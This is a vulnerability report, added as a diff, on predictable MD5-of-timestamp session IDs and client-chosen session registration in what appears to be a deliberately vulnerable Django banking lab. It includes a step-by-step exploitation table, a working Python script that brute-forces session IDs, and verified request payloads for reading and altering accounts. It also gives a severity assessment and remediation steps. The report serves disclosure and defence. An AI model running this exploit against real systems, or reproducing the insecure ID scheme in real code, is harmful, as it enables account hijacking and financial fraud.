@@ -1,0 +1,104 @@
+# Description
+
+**CWE-330: Use of Insufficiently Random Values**
+
+The banking session identifier (SID) is derived from the current Unix time in whole seconds, passed through MD5. The output is deterministic and depends only on a value that is global and easy to observe or guess, so it carries no secret entropy.
+
+Vulnerable code, `djangoWocshack_5/Bank/Utils/generate.py`:
+
+```python
+# generate.py:5-6
+def generate_sid():
+    return hashlib.md5(str(int(time.time())).encode()).hexdigest()
+```
+
+The SID is minted on the Django side in `djangoWocshack_5/Bank/Utils/client.py:143-147` (`make_connection()`), then registered with the banking backend through the `sescr` command (`client.py:77-78`). Each subsequent backend command carries that SID.
+
+A second weakness amplifies the first. The backend stores whatever SID the client supplies:
+
+- `VRC_Banking_System_Backend/Utils/parser.py:24-27` (`create_session`) writes `sessions[sid] = time.time()` for any `sid` in the `sescr` payload, with no check that it came from the server.
+- `VRC_Banking_System_Backend/Utils/parser.py:481-494` accepts any command for a SID present in `sessions`.
+- `djangoWocshack_5/Bank/views.py:423-431` (`quick_transfer`, `@csrf_exempt` and `@login_required()`) builds the backend payload and runs `payload.update(data)`. Any `sid` the caller sends in the JSON body therefore replaces the server-generated SID.
+
+Because of this, an attacker does not need to predict a victim's SID. The attacker can register their own SID through `quick_transfer` and reuse it. In fact `quick_transfer` already opens a valid server-side SID itself (`make_connection()`), so any logged-in user can send any backend command with an arbitrary `user_id` without supplying a `sid` at all. The MD5-of-time weakness still applies to any SID the server mints, and it is what the dev catalog describes (M10): an attacker who knows the approximate creation second of a session can recompute its SID exactly.
+
+# Exploitation
+
+| Step | Action | Result |
+|------|--------|--------|
+| 1 | Log in to the banking app as any authenticated user to obtain a Django `sessionid` cookie. `quick_transfer` is protected by `@login_required()`. | Authenticated Django session. |
+| 2 | Observe a victim's SID or the approximate time their banking session was created (for example from a log line, a captured response, or by triggering a session creation and noting the second). | Target time `t` identified. |
+| 3 | Compute candidate SIDs for a window of seconds around `t`: `md5(str(t))`. | List of candidate SIDs. |
+| 4 | POST each candidate to `/banking/api/quick-transfer/` with `action` set to a backend command (for example `getu`) and `sid` set to the candidate. `payload.update(data)` overrides the generated SID. | Backend returns `{"success": true, "user": {...}}` when the candidate is in `sessions`, `{"error": "No session"}` otherwise. |
+| 5 | Alternatively, skip prediction: POST `action: "sescr"` with an attacker-chosen `sid`, then send follow-up commands with that `sid`. The backend registers the SID and accepts it for 300 seconds, refreshed on each use. | Attacker-controlled backend session, usable for any backend command. |
+| 6 | Use the accepted SID to read or modify the victim's banking data through the backend command set (`getu`, `getau`, `tr`, `sb`, `sp`, `su`, and so on). | Banking-session hijack. |
+
+# PoC
+
+Adapted from the dev catalog README (`poc/m10_sid_predict.py`). It sweeps a window of timestamps, computes MD5 candidates, and submits each one to `quick_transfer`. Run it only against a local, deliberately vulnerable lab instance.
+
+```python
+# m10_sid_predict.py
+import hashlib
+import sys
+import time
+
+import requests
+
+target = sys.argv[1]            # e.g. http://localhost:8000
+victim_id = int(sys.argv[2])    # e.g. 1
+session_cookie = sys.argv[3]    # Django sessionid of any logged-in user
+window = 120                    # seconds to search backwards
+
+t_now = int(time.time())
+
+for t in range(t_now - window, t_now + 1):
+    sid = hashlib.md5(str(t).encode()).hexdigest()
+    try:
+        r = requests.post(
+            f"{target}/banking/api/quick-transfer/",
+            json={"action": "getu", "sid": sid, "user_id": victim_id},
+            cookies={"sessionid": session_cookie},
+            timeout=5,
+        )
+    except requests.RequestException:
+        continue
+    if r.ok:
+        body = r.json()
+        if body.get("status") == "success" or body.get("success"):
+            print(f"[+] valid sid={sid} (t={t})")
+            print(body)
+            break
+else:
+    print("[-] no candidate accepted in the window")
+```
+
+Verified against the live lab instance (test accounts only):
+
+- The command is `getu` (`gu` returns `{"status": "error", "message": "Unknown command gu"}`). A valid SID returns `{"success": true, "user": {"id": ..., "account_number": ..., "payment_number": ..., "pin": "******", "balance": ..., "history": [...]}}`; an unknown SID returns `{"error": "No session"}`. Unauthenticated requests to `quick_transfer` get `302` to the login page.
+- Prediction: a SID minted by the server (`GET /banking/a0faaa38-c51f-428a-bd85-54deb308ac86/none&none&<token>` → `{"sid": "f8e78618..."}`) was exactly `md5(str(t))` for the second `t` of the request, and the sweep above found it as a live session.
+- Client-chosen SID: `{"action": "sescr", "sid": "agentd_chosen_sid"}` → `{"status": "success"}`, then `{"action": "getu", "sid": "agentd_chosen_sid", "user_id": <id>}` → `{"success": true, ...}`.
+- No SID needed: `{"action": "getu", "user_id": <id>}` and `{"action": "sb", "user_id": <id>, "amount": 0.01}` (own test account) both succeed with the SID that `quick_transfer` mints itself.
+
+# Risk
+
+| Dimension | Impact |
+|-----------|--------|
+| Confidentiality | An attacker with a valid SID, or the ability to register one, can call backend read commands (`getu`, `getau`, `getcards`, `su`) and read any account's numbers, balance and history (the `getu` PIN field is masked). |
+| Integrity | The same SID grants write commands (`tr` transfers, `sb` set balance, `sp` set PIN, `delu`, and so on), so balances and account state can be changed in the victim's context. (`su` is a read-only search-by-payment-number command.) |
+| Availability | Limited. Session registration and cleanup run on a single backend process, and SID collisions within the same second can cause one session's `sescl` to invalidate another's. |
+
+Overall severity: **High**. The dev catalog records CVSS 3.1 7.4 (`AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`), but the attack needs an authenticated Django session to reach `quick_transfer`, so `PR:L` is more accurate: the SID-prediction path alone scores 6.8 (`AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N`). The sid-less command path (`getu`/`sb` accepted on any `user_id` without a `sid`) needs no time-window search, which raises it to 8.1 (`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`). The unauthenticated-SID registration path in `create_session` raises the practical risk, and it is independent of the MD5 weakness.
+
+# Remediation
+
+1. Replace `generate_sid()` with a cryptographically random token, for example `secrets.token_urlsafe(32)` or `secrets.token_hex(32)`, in `djangoWocshack_5/Bank/Utils/generate.py`. Remove the time-based derivation entirely.
+2. Stop accepting client-chosen SIDs. The backend should mint the SID in `create_session` and return it, and the Django side should use only that value. Do not let `sescr` accept a SID from the request.
+3. In `quick_transfer` (`djangoWocshack_5/Bank/views.py:431`), do not allow request data to override `sid`. Build the payload from the server-side SID and whitelist the permitted client-supplied fields.
+4. Bind each SID to the authenticated user and enforce server-side authorization for every banking operation. Client IP restrictions may provide additional protection but must not replace user-level authorization.
+5. Rotate SIDs on privilege boundaries (for example after PIN verification) and invalidate them on logout.
+6. Review the 300-second idle TTL in `parser.py`, enforce appropriate session expiration and invalidation policies, and remove sensitive session identifiers from logs (`Activity/Logger.py:88-94`).
+7. Add regression tests covering SID randomness, session ownership, server-side authorization, session expiration and invalidation.
+
+# Author
+WOCSA
